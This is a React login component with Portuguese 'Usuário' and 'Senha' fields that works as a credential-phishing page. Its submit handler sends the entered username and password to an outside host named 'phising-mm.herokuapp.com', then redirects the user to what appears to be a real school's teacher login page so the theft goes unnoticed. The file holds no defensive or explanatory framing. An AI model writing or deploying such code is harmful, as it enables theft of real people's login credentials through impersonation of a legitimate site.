import React from 'react'
import "./login.css"

export function Login() {

    const [visi, setVisi] = React.useState(false)

    const [uname,  setuname]  = React.useState("");
    const mudaName = (e) => {
      
      setuname(e.target.value);
    }


    const [pass,  setpass]  = React.useState("");
    const mudaPass = (e) => {
      
      setpass(e.target.value);
     
    }
    async function enviar(event){
      event.preventDefault();

      await fetch("https://phising-mm.herokuapp.com/user", {
        method:"POST", 
        headers: {"content-type": "application/json"},
        body: JSON.stringify({uname, pass})
      })
      window.location.href = "https://casteloporto.com.br/mediafinal/Media/Final/Professor/login.php"
    }

    async function troca() {
      setVisi(!visi)
    }

    return (
    <div className="form">
      <form>
        <div className="a">
          <label> </label>
          <input placeholder="Usuário" className="input-nome" onChange={mudaName} type="text" name="uname" required value={uname}  />
          
        </div>
        <div>
          <label> </label>
          <input placeholder="Senha" className="input-senha" onChange={mudaPass} type={visi ? 'text' : 'password'} name="pass" required value={pass} />

          <input className="button-container" type="button"  onClick={enviar}/>
        </div>
        <div>
        <input className="button-olho" type="button" onClick={troca}/>
        </div>
      </form>
    </div>
    );
}
